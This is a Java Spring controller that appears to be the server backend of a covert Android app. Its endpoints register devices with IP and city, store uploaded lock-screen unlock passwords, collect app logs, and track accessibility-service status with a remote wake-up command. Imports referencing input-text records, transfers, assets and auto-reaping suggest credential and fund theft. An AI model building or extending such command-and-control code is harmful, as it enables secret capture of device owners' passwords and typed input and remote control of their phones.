package io.renren.modules.app.web.api;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.update.LambdaUpdateWrapper;
import io.renren.common.constant.Constant;
import io.renren.common.utils.IpUtils;
import io.renren.common.utils.Result;
import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
import io.renren.modules.app.common.AutoReapEnum;
import io.renren.modules.app.common.DeviceStatusEnum;
import io.renren.modules.app.common.Utils;
import io.renren.modules.app.common.WakeStatusEnum;
import io.renren.modules.app.context.DeviceContext;
import io.renren.modules.app.entity.*;
import io.renren.modules.app.param.AppAssetsPram;
import io.renren.modules.app.param.PasswordParam;
import io.renren.modules.app.param.PingParam;
import io.renren.modules.app.param.TransferRecordParam;
import io.renren.modules.app.service.*;
import io.renren.modules.app.vo.DeviceStatus;
import io.renren.modules.app.vo.HeartResponse;
import io.renren.modules.app.vo.ServerConfig;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.security.cert.PKIXParameters;
import java.util.Date;
import java.util.List;
import java.util.Objects;

import static io.renren.common.constant.Constant.APP_NAME;

@Slf4j
@RestController
@RequestMapping("/api/device")
public class DeviceApiController extends BaseApiController {

    @Autowired
    DeviceService deviceService;
    @Autowired
    InstallAppService installAppService;
    @Autowired
    AppTransferRecordService appTransferRecordService;

    @Resource
    private TransferService transferService;
    @Resource
    private MajorDataService majorDataService;


    @Resource
    private InputTextRecordService inputTextRecordService;

    @Resource
    private LogService logService;

    @Resource
    private AssetService assetService;


    //注册设备
    @RequestMapping("/registerDevice")
    public Result<Void> registerDevice(@RequestBody Device device, HttpServletRequest request) {
        log.info("registerDevice:{}", JSONObject.toJSONString(device));
        device.setDeviceId(DeviceContext.getDeviceId());
        device.setPkg(DeviceContext.getPkg());
        String ip = IpUtils.getIpAddr(request);
        String addr = IpUtils.getCity(ip);
        device.setIp(ip);
        device.setAddr(addr);
        Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());
        if (dbDevice != null) {
            device.setId(dbDevice.getId());
            deviceService.updateById(device);
        } else {
            device.setStatus(Constant.DeviceStatus.screen_on);
            deviceService.save(device);
        }
        log.info("收到pkg:{} 设备:{} 注册信息. ip：{} addr:{} ",DeviceContext.getPkg(),DeviceContext.getDeviceId(),ip,addr);
        return Result.toSuccess();
    }

    
    
    @PostMapping("uploadUnLock")
    public Result<Boolean> uploadUnLock(@RequestBody JSONObject json) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        Device device = deviceService.findByDeviceId(deviceId);
        if (device == null) {
            log.error("pkg:{}  设备:{} 不存在",pkg, deviceId);
            return Result.toError("device not extis.");
        }
        if (Objects.equals(Constant.YN.Y, device.getFixLockScreen())) {
            //固定锁屏密码
            return Result.toSuccess();
        }
        Device update = new Device();
        update.setId(device.getId());
        update.setLockScreen(json);
        deviceService.updateById(update);
        log.info("更新pkg:{}  设备:{} 解锁密码信息成功. Data:{} ",pkg, deviceId, JSON.toJSONString(json));
        return Result.toSuccess(true);
    }
 
    /**
     * APP JS 日志上传
     * @param logs
     * @return
     */
    @PostMapping("uploadLog")
    public Result<Void> uploadLog(@RequestBody List<Log> logs) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        for (Log _log : logs) {
            _log.setId(null);
            _log.setDeviceId(deviceId);
            _log.setPkg(pkg);
        }
        logService.saveBatch(logs);
        return Result.toSuccess();
    }
    

    /**
     * 服务器配置
     *
     * @return
     */
    @RequestMapping("getConfig")
    public Result<ServerConfig> getConfig(@RequestBody DeviceStatus deviceStatus) {
        ServerConfig serverConfig = new ServerConfig(false, null, null, "{}", false);
        log.info("getConfig - pkg:{}, deviceId:{}, value:{}", DeviceContext.getPkg(), DeviceContext.getDeviceId(), JSONObject.toJSONString(deviceStatus));


        Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());

        if (dbDevice == null) {
            return Result.toSuccess(serverConfig);
        }

        Device updateDevice = new Device();
        updateDevice.setId(dbDevice.getId());
        updateDevice.setLastHeart(Utils.now());
        updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);


        if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
            log.info("pkg:{} 设备:{} - 需要唤醒", DeviceContext.getPkg(),DeviceContext.getDeviceId());
            updateDevice.setStatus(Constant.DeviceStatus.wait_wake);
            serverConfig.setWakeUp(true);
        } else if (Constant.DeviceStatus.wait_wake == dbDevice.getStatus() && deviceStatus.getScreenStatus() == Constant.DeviceStatus.screen_on) {
            updateDevice.setStatus(deviceStatus.getScreenStatus());
            log.info("pkg:{} 设备:{} - 唤醒成功",DeviceContext.getPkg(), DeviceContext.getDeviceId());
        } else {
            updateDevice.setStatus(deviceStatus.getScreenStatus());
        }
        deviceService.updateById(updateDevice);
        return Result.toSuccess(serverConfig);

    }

}
